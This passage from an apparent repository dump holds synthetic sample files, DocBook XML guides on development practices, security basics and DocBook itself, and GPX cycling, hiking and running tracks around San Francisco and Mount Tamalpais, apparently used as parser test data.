      <keyword>agile</keyword>
      <keyword>testing</keyword>
      <keyword>deployment</keyword>
    </keywordset>
  </info>
  
  <chapter xml:id="introduction">
    <title>Introduction</title>
    <para>Software development has evolved significantly over the past decade. 
    This guide provides practical insights into modern development practices.</para>
    
    <section xml:id="overview">
      <title>Overview</title>
      <para>We'll cover the following key areas:</para>
      <itemizedlist>
        <listitem><para>Version control with Git</para></listitem>
        <listitem><para>Agile development methodologies</para></listitem>
        <listitem><para>Testing strategies and automation</para></listitem>
        <listitem><para>Continuous integration and deployment</para></listitem>
      </itemizedlist>
    </section>
  </chapter>
  
  <chapter xml:id="version-control">
    <title>Version Control</title>
    <para>Version control is fundamental to modern software development.</para>
    
    <section xml:id="git-basics">
      <title>Git Basics</title>
      <para>Git is the most widely used version control system.</para>
      
      <example>
        <title>Basic Git Commands</title>
        <programlisting language="bash">
git init
git add .
git commit -m "Initial commit"
git push origin main
        </programlisting>
      </example>
      
      <note>
        <para>Always write meaningful commit messages that describe what changed and why.</para>
      </note>
    </section>
    
    <section xml:id="branching">
      <title>Branching Strategies</title>
      <para>Effective branching strategies help teams collaborate efficiently.</para>
      
      <table>
        <title>Common Branching Models</title>
        <tgroup cols="3">
          <thead>
            <row>
              <entry>Model</entry>
              <entry>Best For</entry>
              <entry>Complexity</entry>
            </row>
          </thead>
          <tbody>
            <row>
              <entry>Git Flow</entry>
              <entry>Large teams</entry>
              <entry>High</entry>
            </row>
            <row>
              <entry>GitHub Flow</entry>
              <entry>Continuous deployment</entry>
              <entry>Low</entry>
            </row>
          </tbody>
        </tgroup>
      </table>
    </section>
  </chapter>
  
  <chapter xml:id="testing">
    <title>Testing Strategies</title>
    <para>Comprehensive testing ensures software quality and reliability.</para>
    
    <section xml:id="unit-testing">
      <title>Unit Testing</title>
      <para>Unit tests verify individual components in isolation.</para>
      
      <warning>
        <para>Tests should be fast, reliable, and independent of each other.</para>
      </warning>
      
      <example>
        <title>Sample Unit Test</title>
        <programlisting language="python">
def test_calculate_total():
    calculator = Calculator()
    result = calculator.add(2, 3)
    assert result == 5
        </programlisting>
      </example>
    </section>
  </chapter>
  
  <appendix xml:id="resources">
    <title>Additional Resources</title>
    <para>Useful links and references for further learning.</para>
    
    <itemizedlist>
      <listitem>
        <para><link linkend="git-basics">Git Documentation</link></para>
      </listitem>
      <listitem>
        <para>External resource: <ulink url="https://git-scm.com/">Official Git Website</ulink></para>
      </listitem>
    </itemizedlist>
  </appendix>
</book>
</file>

<file path="sample_data/test_files_synthetic/small/docbook/chapter.xml">
<?xml version="1.0" encoding="UTF-8"?>
<chapter xmlns="http://docbook.org/ns/docbook" version="5.0" xml:id="security-chapter">
  <title>Security Best Practices</title>
  
  <section xml:id="authentication">
    <title>Authentication</title>
    <para>Secure authentication is the foundation of application security.</para>
    
    <section xml:id="password-policies">
      <title>Password Policies</title>
      <para>Implement strong password requirements:</para>
      
      <orderedlist>
        <listitem><para>Minimum 12 characters length</para></listitem>
        <listitem><para>Mix of uppercase, lowercase, numbers, and symbols</para></listitem>
        <listitem><para>No common dictionary words</para></listitem>
        <listitem><para>Regular password rotation</para></listitem>
      </orderedlist>
      
      <caution>
        <para>Never store passwords in plain text. Always use proper hashing 
        algorithms like bcrypt or Argon2.</para>
      </caution>
    </section>
  </section>
  
  <section xml:id="encryption">
    <title>Data Encryption</title>
    <para>Protect sensitive data both at rest and in transit.</para>
    
    <figure>
      <title>Encryption Flow Diagram</title>
      <mediaobject>
        <imageobject>
          <imagedata fileref="encryption-flow.png" format="PNG" width="400px"/>
        </imageobject>
        <textobject>
          <phrase>Diagram showing data encryption and decryption process</phrase>
        </textobject>
      </mediaobject>
    </figure>
    
    <example>
      <title>Encrypting Sensitive Data</title>
      <programlisting language="python">
from cryptography.fernet import Fernet

# Generate a key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Encrypt data
encrypted_data = cipher_suite.encrypt(b"sensitive information")

# Decrypt data
decrypted_data = cipher_suite.decrypt(encrypted_data)
      </programlisting>
    </example>
  </section>
</chapter>
</file>

<file path="sample_data/test_files_synthetic/small/docbook/sample-docbook-guide.xml">
<?xml version="1.0" encoding="UTF-8"?>
<book xmlns="http://docbook.org/ns/docbook" 
      xmlns:xlink="http://www.w3.org/1999/xlink"
      version="5.0" 
      xml:id="sample-docbook-guide">
  
  <title>Sample DocBook Guide</title>
  <titleabbrev>DocBook Guide</titleabbrev>
  <subtitle>A Comprehensive Example of DocBook XML Structure</subtitle>
  
  <info>
    <author>
      <personname>
        <givenname>John</givenname>
        <surname>Smith</surname>
      </personname>
      <email>john.smith@example.com</email>
    </author>
    
    <editor>
      <personname>
        <givenname>Jane</givenname>
        <surname>Doe</surname>
      </personname>
    </editor>
    
    <publisher>
      <publishername>Example Publishing</publishername>
      <address>
        <city>New York</city>
        <country>USA</country>
        <uri>https://www.example-publishing.com</uri>
      </address>
    </publisher>
    
    <copyright>
      <year>2025</year>
      <holder>Example Publishing Inc.</holder>
    </copyright>
    
    <legalnotice>
      <para>This work is licensed under the Creative Commons Attribution-ShareAlike 4.0 International License.</para>
    </legalnotice>
    
    <abstract>
      <para>This document demonstrates the structure and usage of DocBook XML format for technical documentation.</para>
    </abstract>
    
    <biblioid class="isbn">978-0-123456-78-9</biblioid>
    <edition>First Edition</edition>
    
    <revhistory>
      <revision>
        <revnumber>1.0</revnumber>
        <date>2025-07-23</date>
        <revremark>Initial release</revremark>
      </revision>
    </revhistory>
  </info>
  
  <!-- Preface -->
  <preface xml:id="preface">
    <title>Preface</title>
    <para>Welcome to this comprehensive guide on DocBook XML. This documentation format has been widely adopted for technical writing and publishing workflows.</para>
    
    <sect1>
      <title>About This Guide</title>
      <para>This guide covers the essential elements of DocBook and provides practical examples for creating structured documentation.</para>
    </sect1>
    
    <sect1>
      <title>Intended Audience</title>
      <para>This guide is intended for technical writers, documentation specialists, and anyone interested in structured authoring.</para>
    </sect1>
  </preface>
  
  <!-- Part I -->
  <part xml:id="part-basics">
    <title>DocBook Basics</title>
    <partintro>
      <para>This part covers the fundamental concepts and elements of DocBook XML.</para>
    </partintro>
    
    <!-- Chapter 1 -->
    <chapter xml:id="chapter-intro">
      <title>Introduction to DocBook</title>
      
      <section xml:id="section-what-is-docbook">
        <title>What is DocBook?</title>
        <para>DocBook is a <emphasis role="strong">semantic markup language</emphasis> for technical documentation. It allows authors to create content that is presentation-neutral and easily converted to various output formats.</para>
        
        <para>Key benefits of DocBook include:</para>
        <itemizedlist>
          <listitem><para>Separation of content from presentation</para></listitem>
          <listitem><para>Standardized structure for technical documents</para></listitem>
          <listitem><para>Multiple output formats (HTML, PDF, EPUB, etc.)</para></listitem>
          <listitem><para>Excellent cross-referencing capabilities</para></listitem>
        </itemizedlist>
      </section>
      
      <section xml:id="section-history">
        <title>History and Development</title>
        <para>DocBook was originally developed in the 1990s and has evolved significantly over time. The current version, DocBook 5.0, uses XML namespaces and provides enhanced flexibility.</para>
        
        <note>
          <title>Version Information</title>
          <para>This document uses DocBook 5.0, which is the current standard for new projects.</para>
        </note>
      </section>
    </chapter>
    
    <!-- Chapter 2 -->
    <chapter xml:id="chapter-elements">
      <title>Common DocBook Elements</title>
      
      <section xml:id="section-structural-elements">
        <title>Structural Elements</title>
        <para>DocBook provides various structural elements to organize content hierarchically.</para>
        
        <variablelist>
          <varlistentry>
            <term><tag>book</tag></term>
            <listitem><para>The top-level element for a complete book</para></listitem>
          </varlistentry>
          <varlistentry>
            <term><tag>part</tag></term>
            <listitem><para>Major divisions within a book</para></listitem>
          </varlistentry>
          <varlistentry>
            <term><tag>chapter</tag></term>
            <listitem><para>Individual chapters within a book or part</para></listitem>
          </varlistentry>
          <varlistentry>
            <term><tag>section</tag></term>
            <listitem><para>Subdivisions within chapters</para></listitem>
          </varlistentry>
        </variablelist>
      </section>
      
      <section xml:id="section-inline-elements">
        <title>Inline Elements</title>
        <para>DocBook provides numerous inline elements for marking up text semantically.</para>
        
        <para>Examples include: <emphasis>emphasis</emphasis>, <code>code</code>, <filename>filename.xml</filename>, <application>Application Name</application>, and <uri xlink:href="https://docbook.org">links</uri>.</para>
      </section>
      
      <section xml:id="section-block-elements">
        <title>Block Elements</title>
        <para>Block-level elements provide structure for different types of content.</para>
        
        <example xml:id="example-code-block">
          <title>Sample Code Block</title>
          <programlisting language="xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?>
<book xmlns="http://docbook.org/ns/docbook" version="5.0">
  <title>My DocBook Document</title>
  <chapter>
    <title>First Chapter</title>
    <para>This is a paragraph.</para>
  </chapter>
</book>]]></programlisting>
        </example>
        
        <warning>
          <title>Important Note</title>
          <para>Always validate your DocBook documents against the official schema to ensure compatibility.</para>
        </warning>
      </section>
    </chapter>
  </part>
  
  <!-- Part II -->
  <part xml:id="part-advanced">
    <title>Advanced Topics</title>
    
    <chapter xml:id="chapter-publishing">
      <title>Publishing Workflows</title>
      
      <section xml:id="section-toolchains">
        <title>DocBook Toolchains</title>
        <para>Several tools are available for processing DocBook documents.</para>
        
        <table xml:id="table-toolchains">
          <title>Popular DocBook Toolchains</title>
          <tgroup cols="3">
            <thead>
              <row>
                <entry>Tool</entry>
                <entry>Output Formats</entry>
                <entry>Language</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry>xsltproc</entry>
                <entry>HTML, FO</entry>
                <entry>XSLT</entry>
              </row>
              <row>
                <entry>dblatex</entry>
                <entry>PDF</entry>
                <entry>Python</entry>
              </row>
              <row>
                <entry>Pandoc</entry>
                <entry>Multiple</entry>
                <entry>Haskell</entry>
              </row>
            </tbody>
          </tgroup>
        </table>
      </section>
    </chapter>
  </part>
  
  <!-- Appendices -->
  <appendix xml:id="appendix-resources">
    <title>Additional Resources</title>
    
    <section xml:id="section-online-resources">
      <title>Online Resources</title>
      <itemizedlist>
        <listitem>
          <para><uri xlink:href="https://docbook.org">Official DocBook Website</uri></para>
        </listitem>
        <listitem>
          <para><uri xlink:href="https://tdg.docbook.org">DocBook: The Definitive Guide</uri></para>
        </listitem>
      </itemizedlist>
    </section>
  </appendix>
  
  <!-- Index -->
  <index xml:id="book-index">
    <title>Index</title>
    <indexentry>
      <primaryie>DocBook</primaryie>
      <secondaryie>elements</secondaryie>
    </indexentry>
    <indexentry>
      <primaryie>XML</primaryie>
      <secondaryie>namespaces</secondaryie>
    </indexentry>
  </index>

</book>
</file>

<file path="sample_data/test_files_synthetic/small/gpx/cycling_route.gpx">
<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="RideWithGPS" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>Bay Area Cycling Route</name>
    <desc>Scenic cycling route from Golden Gate Park to Sausalito</desc>
    <time>2024-02-01T07:00:00Z</time>
  </metadata>
  
  <!-- Planned route with waypoints -->
  <rte>
    <name>GG Park to Sausalito Route</name>
    <desc>Planned cycling route with key waypoints</desc>
    <number>1</number>
    <type>Cycling</type>
    <src>Route Planner</src>
    
    <rtept lat="37.7694" lon="-122.4862">
      <ele>32</ele>
      <name>Golden Gate Park Start</name>
      <desc>Starting point at JFK Drive</desc>
    </rtept>
    
    <rtept lat="37.7749" lon="-122.4582">
      <ele>45</ele>
      <name>Panhandle</name>
      <desc>Ride through the Panhandle</desc>
    </rtept>
    
    <rtept lat="37.7849" lon="-122.4394">
      <ele>76</ele>
      <name>Russian Hill</name>
      <desc>Climb through Russian Hill</desc>
    </rtept>
    
    <rtept lat="37.8024" lon="-122.4058">
      <ele>12</ele>
      <name>Fisherman's Wharf</name>
      <desc>Pass by Fisherman's Wharf</desc>
    </rtept>
    
    <rtept lat="37.8085" lon="-122.4135">
      <ele>8</ele>
      <name>Crissy Field</name>
      <desc>Ride through Crissy Field</desc>
    </rtept>
    
    <rtept lat="37.8199" lon="-122.4783">
      <ele>67</ele>
      <name>Golden Gate Bridge</name>
      <desc>Cross the Golden Gate Bridge</desc>
    </rtept>
    
    <rtept lat="37.8590" lon="-122.4852">
      <ele>5</ele>
      <name>Sausalito Ferry</name>
      <desc>End point at Sausalito Ferry Terminal</desc>
    </rtept>
  </rte>
  
  <!-- Additional waypoints of interest -->
  <wpt lat="37.7749" lon="-122.4194">
    <ele>16</ele>
    <name>City Hall</name>
    <desc>San Francisco City Hall</desc>
    <sym>Government</sym>
    <type>Landmark</type>
  </wpt>
  
  <wpt lat="37.8024" lon="-122.4058">
    <ele>12</ele>
    <name>Pier 39</name>
    <desc>Tourist attraction with sea lions</desc>
    <sym>Marina</sym>
    <type>Tourism</type>
  </wpt>
  
  <wpt lat="37.8199" lon="-122.4783">
    <ele>67</ele>
    <name>Golden Gate Bridge</name>
    <desc>Iconic suspension bridge</desc>
    <sym>Bridge</sym>
    <type>Landmark</type>
  </wpt>
</gpx>
</file>

<file path="sample_data/test_files_synthetic/small/gpx/hiking_track.gpx">
<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Garmin Connect" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>Mount Tamalpais Hiking Trail</name>
    <desc>Scenic hiking trail in Marin County with elevation gain</desc>
    <time>2024-01-20T08:00:00Z</time>
  </metadata>
  
  <trk>
    <name>Mount Tam West Peak Trail</name>
    <desc>Moderate hike to West Peak with panoramic views</desc>
    <type>Hiking</type>
    <trkseg>
      <trkpt lat="37.9231" lon="-122.5963">
        <ele>183</ele>
        <time>2024-01-20T08:00:00Z</time>
        <speed>0.0</speed>
        <course>0</course>
        <hdop>2.1</hdop>
        <vdop>1.8</vdop>
        <pdop>2.7</pdop>
      </trkpt>
      <trkpt lat="37.9235" lon="-122.5968">
        <ele>195</ele>
        <time>2024-01-20T08:02:00Z</time>
        <speed>1.2</speed>
        <course>315</course>
        <hdop>2.0</hdop>
        <vdop>1.7</vdop>
        <pdop>2.6</pdop>
      </trkpt>
      <trkpt lat="37.9242" lon="-122.5975">
        <ele>218</ele>
        <time>2024-01-20T08:05:00Z</time>
        <speed>1.1</speed>
        <course>320</course>
        <hdop>1.9</hdop>
        <vdop>1.6</vdop>
        <pdop>2.5</pdop>
      </trkpt>
      <trkpt lat="37.9251" lon="-122.5982">
        <ele>245</ele>
        <time>2024-01-20T08:08:00Z</time>
        <speed>1.0</speed>
        <course>325</course>
        <hdop>2.1</hdop>
      </trkpt>
      <trkpt lat="37.9264" lon="-122.5991">
        <ele>278</ele>
        <time>2024-01-20T08:12:00Z</time>
        <speed>0.9</speed>
        <course>330</course>
        <hdop>2.2</hdop>
      </trkpt>
      <trkpt lat="37.9278" lon="-122.6001">
        <ele>312</ele>
        <time>2024-01-20T08:16:00Z</time>
        <speed>1.1</speed>
        <course>335</course>
        <hdop>1.8</hdop>
      </trkpt>
      <trkpt lat="37.9294" lon="-122.6012">
        <ele>354</ele>
        <time>2024-01-20T08:21:00Z</time>
        <speed>1.0</speed>
        <course>340</course>
        <hdop>1.9</hdop>
      </trkpt>
      <trkpt lat="37.9308" lon="-122.6021">
        <ele>398</ele>
        <time>2024-01-20T08:26:00Z</time>
        <speed>0.8</speed>
        <course>342</course>
        <hdop>2.0</hdop>
      </trkpt>
      <trkpt lat="37.9319" lon="-122.6028">
        <ele>445</ele>
        <time>2024-01-20T08:32:00Z</time>
        <speed>0.7</speed>
        <course>345</course>
        <hdop>2.1</hdop>
      </trkpt>
      <trkpt lat="37.9326" lon="-122.6032">
        <ele>478</ele>
        <time>2024-01-20T08:37:00Z</time>
        <speed>0.9</speed>
        <course>348</course>
        <hdop>1.8</hdop>
      </trkpt>
      <trkpt lat="37.9331" lon="-122.6035">
        <ele>502</ele>
        <time>2024-01-20T08:42:00Z</time>
        <speed>1.0</speed>
        <course>350</course>
        <hdop>1.7</hdop>
      </trkpt>
      <trkpt lat="37.9334" lon="-122.6037">
        <ele>521</ele>
        <time>2024-01-20T08:46:00Z</time>
        <speed>0.6</speed>
        <course>352</course>
        <hdop>1.9</hdop>
      </trkpt>
      <!-- West Peak Summit -->
      <trkpt lat="37.9336" lon="-122.6038">
        <ele>537</ele>
        <time>2024-01-20T08:50:00Z</time>
        <speed>0.0</speed>
        <course>0</course>
        <hdop>1.6</hdop>
      </trkpt>
      <!-- Return journey (descent) -->
      <trkpt lat="37.9334" lon="-122.6037">
        <ele>521</ele>
        <time>2024-01-20T09:05:00Z</time>
        <speed>1.2</speed>
        <course>172</course>
        <hdop>1.8</hdop>
      </trkpt>
      <trkpt lat="37.9331" lon="-122.6035">
        <ele>502</ele>
        <time>2024-01-20T09:08:00Z</time>
        <speed>1.4</speed>
        <course>170</course>
        <hdop>1.9</hdop>
      </trkpt>
      <trkpt lat="37.9326" lon="-122.6032">
        <ele>478</ele>
        <time>2024-01-20T09:12:00Z</time>
        <speed>1.5</speed>
        <course>168</course>
        <hdop>2.0</hdop>
      </trkpt>
      <trkpt lat="37.9319" lon="-122.6028">
        <ele>445</ele>
        <time>2024-01-20T09:17:00Z</time>
        <speed>1.6</speed>
        <course>165</course>
        <hdop>1.8</hdop>
      </trkpt>
      <trkpt lat="37.9308" lon="-122.6021">
        <ele>398</ele>
        <time>2024-01-20T09:22:00Z</time>
        <speed>1.7</speed>
        <course>162</course>
        <hdop>1.7</hdop>
      </trkpt>
      <trkpt lat="37.9294" lon="-122.6012">
        <ele>354</ele>
        <time>2024-01-20T09:27:00Z</time>
        <speed>1.8</speed>
        <course>160</course>
        <hdop>1.9</hdop>
      </trkpt>
      <trkpt lat="37.9278" lon="-122.6001">
        <ele>312</ele>
        <time>2024-01-20T09:31:00Z</time>
        <speed>1.9</speed>
        <course>155</course>
        <hdop>2.0</hdop>
      </trkpt>
      <trkpt lat="37.9264" lon="-122.5991">
        <ele>278</ele>
        <time>2024-01-20T09:35:00Z</time>
        <speed>1.8</speed>
        <course>150</course>
        <hdop>2.1</hdop>
      </trkpt>
      <trkpt lat="37.9251" lon="-122.5982">
        <ele>245</ele>
        <time>2024-01-20T09:38:00Z</time>
        <speed>1.7</speed>
        <course>145</course>
        <hdop>1.9</hdop>
      </trkpt>
      <trkpt lat="37.9242" lon="-122.5975">
        <ele>218</ele>
        <time>2024-01-20T09:41:00Z</time>
        <speed>1.6</speed>
        <course>140</course>
        <hdop>1.8</hdop>
      </trkpt>
      <trkpt lat="37.9235" lon="-122.5968">
        <ele>195</ele>
        <time>2024-01-20T09:44:00Z</time>
        <speed>1.5</speed>
        <course>135</course>
        <hdop>2.0</hdop>
      </trkpt>
      <trkpt lat="37.9231" lon="-122.5963">
        <ele>183</ele>
        <time>2024-01-20T09:46:00Z</time>
        <speed>0.0</speed>
        <course>0</course>
        <hdop>2.1</hdop>
      </trkpt>
    </trkseg>
  </trk>
</gpx>
</file>

<file path="sample_data/test_files_synthetic/small/gpx/mount-tamalpais-hike.gpx">
<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" 
     creator="Sample GPS Device v2.3" 
     xmlns="http://www.topografix.com/GPX/1/1"
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd">

  <metadata>
    <name>Mount Tamalpais State Park Hiking Trail</name>
    <desc>A challenging 8.5-mile loop trail through Mount Tamalpais State Park in Marin County, California. Features scenic views, redwood groves, and diverse wildlife.</desc>
    <author>
      <n>Trail Rangers Association</n>
      <email id="info" domain="trailrangers.org"/>
      <link href="https://www.trailrangers.org">
        <text>Trail Rangers Association</text>
        <type>text/html</type>
      </link>
    </author>
    <copyright author="Trail Rangers Association">
      <year>2025</year>
      <license>https://creativecommons.org/licenses/by-sa/4.0/</license>
    </copyright>
    <time>2025-07-23T09:15:00Z</time>
    <keywords>hiking, mountain, redwood, california, marin, tamalpais, loop trail</keywords>
    <bounds minlat="37.8850" minlon="-122.6200" maxlat="37.9250" maxlon="-122.5800"/>
  </metadata>

  <!-- Waypoints -->
  <wpt lat="37.8956" lon="-122.6056">
    <ele>78.5</ele>
    <time>2025-07-23T09:15:00Z</time>
    <n>Trailhead Parking</n>
    <desc>Main parking area and trail start. Restrooms and water available.</desc>
    <sym>Parking Area</sym>
    <type>parking</type>
    <cmt>Large parking area with 50+ spaces. Can get crowded on weekends.</cmt>
    <src>GPS Survey 2025</src>
    <link href="https://www.parks.ca.gov/pages/471/files/mt-tam-map.pdf">
      <text>Park Map</text>
      <type>application/pdf</type>
    </link>
    <sat>8</sat>
    <hdop>1.2</hdop>
    <vdop>1.8</vdop>
    <pdop>2.1</pdop>
    <ageofdgpsdata>0</ageofdgpsdata>
    <dgpsid>0</dgpsid>
  </wpt>

  <wpt lat="37.9012" lon="-122.6089">
    <ele>156.7</ele>
    <time>2025-07-23T09:45:00Z</time>
    <n>Redwood Grove Overlook</n>
    <desc>Scenic overlook with views of the ancient redwood grove below.</desc>
    <sym>Scenic Area</sym>
    <type>overlook</type>
    <cmt>Great photo opportunity. Bench available for rest.</cmt>
  </wpt>

  <wpt lat="37.9156" lon="-122.5978">
    <ele>412.3</ele>
    <time>2025-07-23T11:30:00Z</time>
    <n>West Peak Summit</n>
    <desc>West Peak summit with 360-degree views of the Bay Area.</desc>
    <sym>Summit</sym>
    <type>summit</type>
    <cmt>Highest point on the trail. Weather station and radio towers present.</cmt>
  </wpt>

  <wpt lat="37.9089" lon="-122.5845">
    <ele>298.6</ele>
    <time>2025-07-23T12:45:00Z</time>
    <n>Rock Spring</n>
    <desc>Natural spring with potable water. Historic stone structure.</desc>
    <sym>Water Source</sym>
    <type>water</type>
    <cmt>Reliable water source. Purification recommended.</cmt>
  </wpt>

  <wpt lat="37.8934" lon="-122.5923">
    <ele>189.4</ele>
    <time>2025-07-23T13:15:00Z</time>
    <n>Mountain Theater</n>
    <desc>Historic outdoor amphitheater carved into the mountainside.</desc>
    <sym>Historic Site</sym>
    <type>historic</type>
    <cmt>Built in 1913. Summer performances held here.</cmt>
  </wpt>

  <!-- Route Planning -->
  <rte>
    <n>Recommended Route - Clockwise Loop</n>
    <desc>Best route for intermediate to advanced hikers. Follow trail markers.</desc>
    <src>Trail Rangers Association</src>
    <link href="https://www.trailrangers.org/mt-tam-loop">
      <text>Detailed Trail Guide</text>
      <type>text/html</type>
    </link>
    <number>1</number>
    <type>hiking</type>
    
    <rtept lat="37.8956" lon="-122.6056">
      <ele>78.5</ele>
      <n>Trailhead Start</n>
      <desc>Begin hike at main parking area</desc>
      <sym>Flag, Green</sym>
    </rtept>
    
    <rtept lat="37.8978" lon="-122.6067">
      <ele>95.2</ele>
      <n>Fire Road Junction</n>
      <desc>Take left fork onto Verna Dunshee Trail</desc>
      <sym>Trail Head</sym>
    </rtept>
    
    <rtept lat="37.9012" lon="-122.6089">
      <ele>156.7</ele>
      <n>Redwood Grove</n>
      <desc>First major viewpoint</desc>
      <sym>Scenic Area</sym>
    </rtept>
    
    <rtept lat="37.9078" lon="-122.6034">
      <ele>245.8</ele>
      <n>Trail Split</n>
      <desc>Continue straight on Plankwalk Trail</desc>
      <sym>Trail Head</sym>
    </rtept>
    
    <rtept lat="37.9156" lon="-122.5978">
      <ele>412.3</ele>
      <n>West Peak Summit</n>
      <desc>Highest point with panoramic views</desc>
      <sym>Summit</sym>
    </rtept>
    
    <rtept lat="37.9089" lon="-122.5845">
      <ele>298.6</ele>
      <n>Rock Spring</n>
      <desc>Water and rest stop</desc>
      <sym>Water Source</sym>
    </rtept>
    
    <rtept lat="37.8934" lon="-122.5923">
      <ele>189.4</ele>
      <n>Mountain Theater</n>
      <desc>Historic amphitheater</desc>
      <sym>Historic Site</sym>
    </rtept>
    
    <rtept lat="37.8956" lon="-122.6056">
      <ele>78.5</ele>
      <n>Return to Trailhead</n>
      <desc>Complete the loop</desc>
      <sym>Flag, Red</sym>
    </rtept>
  </rte>

  <!-- GPS Track Data -->
  <trk>
    <n>Mount Tamalpais Loop Trail - July 23, 2025</n>
    <desc>Actual GPS track from morning hike. Total distance: 8.47 miles, Duration: 4h 32m</desc>
    <src>Garmin eTrex 32x</src>
    <link href="https://connect.garmin.com/modern/activity/12345678">
      <text>Garmin Connect Activity</text>
      <type>text/html</type>
    </link>
    <number>1</number>
    <type>hiking</type>
    
    <trkseg>
      <trkpt lat="37.8956" lon="-122.6056">
        <ele>78.5</ele>
        <time>2025-07-23T09:15:00Z</time>
        <course>245.5</course>
        <speed>0.0</speed>
        <sat>8</sat>
        <hdop>1.2</hdop>
        <vdop>1.8</vdop>
        <pdop>2.1</pdop>
      </trkpt>
      
      <trkpt lat="37.8958" lon="-122.6059">
        <ele>79.1</ele>
        <time>2025-07-23T09:15:30Z</time>
        <course>245.8</course>
        <speed>1.2</speed>
        <sat>8</sat>
        <hdop>1.1</hdop>
        <vdop>1.7</vdop>
        <pdop>2.0</pdop>
      </trkpt>
      
      <trkpt lat="37.8962" lon="-122.6063">
        <ele>81.3</ele>
        <time>2025-07-23T09:16:00Z</time>
        <course>248.2</course>
        <speed>1.5</speed>
        <sat>9</sat>
        <hdop>1.0</hdop>
        <vdop>1.6</vdop>
        <pdop>1.9</pdop>
      </trkpt>
      
      <trkpt lat="37.8968" lon="-122.6065">
        <ele>84.7</ele>
        <time>2025-07-23T09:17:00Z</time>
        <course>15.3</course>
        <speed>1.8</speed>
        <sat>9</sat>
        <hdop>0.9</hdop>
        <vdop>1.5</vdop>
        <pdop>1.8</pdop>
      </trkpt>
      
      <trkpt lat="37.8975" lon="-122.6067">
        <ele>92.1</ele>
        <time>2025-07-23T09:18:30Z</time>
        <course>12.7</course>
        <speed>1.6</speed>
        <sat>9</sat>
        <hdop>0.9</hdop>
        <vdop>1.4</vdop>
        <pdop>1.7</pdop>
      </trkpt>
      
      <!-- Simulated track continues... showing variety of data points -->
      <trkpt lat="37.9012" lon="-122.6089">
        <ele>156.7</ele>
        <time>2025-07-23T09:45:00Z</time>
        <course>315.4</course>
        <speed>1.1</speed>
        <sat>7</sat>
        <hdop>1.4</hdop>
        <vdop>2.1</vdop>
        <pdop>2.5</pdop>
      </trkpt>
      
      <trkpt lat="37.9078" lon="-122.6034">
        <ele>245.8</ele>
        <time>2025-07-23T10:30:00Z</time>
        <course>45.8</course>
        <speed>0.8</speed>
        <sat>6</sat>
        <hdop>1.8</hdop>
        <vdop>2.4</vdop>
        <pdop>3.0</pdop>
      </trkpt>
      
      <trkpt lat="37.9156" lon="-122.5978">
        <ele>412.3</ele>
        <time>2025-07-23T11:30:00Z</time>
        <course>0.0</course>
        <speed>0.0</speed>
        <sat>5</sat>
        <hdop>2.1</hdop>
        <vdop>2.8</vdop>
        <pdop>3.5</pdop>
      </trkpt>
      
      <trkpt lat="37.9089" lon="-122.5845">
        <ele>298.6</ele>
        <time>2025-07-23T12:45:00Z</time>
        <course>180.2</course>
        <speed>1.3</speed>
        <sat>8</sat>
        <hdop>1.3</hdop>
        <vdop>1.9</vdop>
        <pdop>2.3</pdop>
      </trkpt>
      
      <trkpt lat="37.8934" lon="-122.5923">
        <ele>189.4</ele>
        <time>2025-07-23T13:15:00Z</time>
        <course>225.7</course>
        <speed>1.4</speed>
        <sat>9</sat>
        <hdop>1.0</hdop>
        <vdop>1.5</vdop>
        <pdop>1.8</pdop>
      </trkpt>
      
      <trkpt lat="37.8956" lon="-122.6056">
        <ele>78.5</ele>
        <time>2025-07-23T13:47:00Z</time>
        <course>0.0</course>
        <speed>0.0</speed>
        <sat>8</sat>
        <hdop>1.2</hdop>
        <vdop>1.8</vdop>
        <pdop>2.1</pdop>
      </trkpt>
    </trkseg>
  </trk>

  <!-- Second track segment for return path -->
  <trk>
    <n>Alternative Return Route</n>
    <desc>Alternative descent route via Old Railroad Grade</desc>
    <type>hiking</type>
    
    <trkseg>
      <trkpt lat="37.9156" lon="-122.5978">
        <ele>412.3</ele>
        <time>2025-07-23T11:30:00Z</time>
      </trkpt>
      
      <trkpt lat="37.9134" lon="-122.6012">
        <ele>385.2</ele>
        <time>2025-07-23T11:45:00Z</time>
      </trkpt>
      
      <trkpt lat="37.9098" lon="-122.6045">
        <ele>312.7</ele>
        <time>2025-07-23T12:15:00Z</time>
      </trkpt>
      
      <trkpt lat="37.9034" lon="-122.6067">
        <ele>198.4</ele>
        <time>2025-07-23T12:45:00Z</time>
      </trkpt>
      
      <trkpt lat="37.8978" lon="-122.6058">
        <ele>124.8</ele>
        <time>2025-07-23T13:10:00Z</time>
      </trkpt>
      
      <trkpt lat="37.8956" lon="-122.6056">
        <ele>78.5</ele>
        <time>2025-07-23T13:25:00Z</time>
      </trkpt>
    </trkseg>
  </trk>

</gpx>
</file>

<file path="sample_data/test_files_synthetic/small/gpx/running_activity.gpx">
<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Strava" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>Morning Run - Golden Gate Park</name>
    <desc>5K morning run through Golden Gate Park with splits</desc>
    <author>
      <name>Runner123</name>
    </author>
    <time>2024-02-10T06:30:00Z</time>
  </metadata>
  
  <trk>
    <name>Golden Gate Park 5K</name>
    <desc>Running loop through the park</desc>
    <type>Running</type>
    <number>1</number>
    <src>Strava GPS</src>
    
    <trkseg>
      <!-- Start at Kezar Stadium -->
      <trkpt lat="37.7661" lon="-122.4560">
        <ele>35</ele>
        <time>2024-02-10T06:30:00Z</time>
        <speed>0.0</speed>
        <course>0</course>
        <hdop>1.5</hdop>
      </trkpt>
      
      <!-- 1 minute in - warming up -->
      <trkpt lat="37.7665" lon="-122.4580">
        <ele>37</ele>
        <time>2024-02-10T06:31:00Z</time>
        <speed>2.8</speed>
        <course>285</course>
        <hdop>1.4</hdop>
      </trkpt>
      
      <!-- 5 minutes - reaching steady pace -->
      <trkpt lat="37.7680" lon="-122.4650">
        <ele>42</ele>
        <time>2024-02-10T06:35:00Z</time>
        <speed>3.5</speed>
        <course>320</course>
